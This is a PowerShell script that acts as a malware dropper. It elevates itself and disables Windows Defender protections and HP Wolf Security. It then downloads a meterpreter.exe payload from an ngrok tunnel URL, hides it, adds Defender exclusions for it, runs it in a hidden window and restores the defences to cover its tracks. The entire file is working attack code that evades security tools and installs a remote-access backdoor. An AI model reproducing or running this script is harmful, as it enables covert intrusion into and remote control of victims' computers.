# Check for Administrator Privileges
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    Exit
}

# Temporarily Disable Windows Defender Components
Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableBlockAtFirstSeen $true -DisableIOAVProtection $true -DisablePrivacyMode $true -SignatureDisableUpdateOnStartupWithoutEngine $true

# Stop HP Wolf Security Service if Running
$hpWolfService = Get-Service -Name "HPWolfService" -ErrorAction SilentlyContinue

if ($hpWolfService -and $hpWolfService.Status -eq 'Running') {
    Stop-Service -Name "HPWolfService" -Force
    Set-Service -Name "HPWolfService" -StartupType Disabled
}

# Terminate HP Client Security Manager Process
$hpWolfProcessPath = "c:\Program Files\HP\HP Client Security Manager\HP.ClientSecurityManager.exe"
$hpWolfProcess = Get-Process | Where-Object { $_.Path -eq $hpWolfProcessPath } -ErrorAction SilentlyContinue

if ($hpWolfProcess) {
    Stop-Process -Name "HP.ClientSecurityManager" -Force
}

# Add file and directory to HP Wolf Security Exclusion List
# This is a placeholder - Replace this with actual API calls or registry edits if available
Write-Host "Attempting to add exclusion to HP Wolf Security - Placeholder step"

# Download the executable file
$sourceUrl = "https://71b6-213-55-184-163.ngrok-free.app/meterpreter.exe"
$destinationPath = "C:\Program Files (x86)\WindowsPowerShell\Modules\temp\meterpreter.exe"

# Ensure the Temp directory exists
if (-not (Test-Path "C:\Program Files (x86)\WindowsPowerShell\Modules\Temp")) {
    New-Item -Path "C:\Program Files (x86)\WindowsPowerShell\Modules\Temp" -ItemType Directory
}

Invoke-WebRequest -Uri $sourceUrl -OutFile $destinationPath

# Hide the executable file
Set-ItemProperty -Path $destinationPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)

# Add the executable file and its directory to the Windows Defender exclusion list
Add-MpPreference -ExclusionPath "C:\Program Files (x86)\WindowsPowerShell\Modules\temp\"
Add-MpPreference -ExclusionProcess "$destinationPath"

# Re-enable Windows Defender Components
Set-MpPreference -DisableRealtimeMonitoring $false -DisableBehaviorMonitoring $false -DisableBlockAtFirstSeen $false -DisableIOAVProtection $false -DisablePrivacyMode $false -SignatureDisableUpdateOnStartupWithoutEngine $false

# Run the executable file in the background
Start-Process -FilePath $destinationPath -WindowStyle Hidden

# Re-enable HP Wolf Security Service and Process
if ($hpWolfService) {
    Set-Service -Name "HPWolfService" -StartupType Automatic
    Start-Service -Name "HPWolfService"
}

if (-not (Get-Process -Name "HP.ClientSecurityManager" -ErrorAction SilentlyContinue)) {
    Start-Process -FilePath $hpWolfProcessPath
    Write-Host "HP Client Security Manager re-enabled."
}

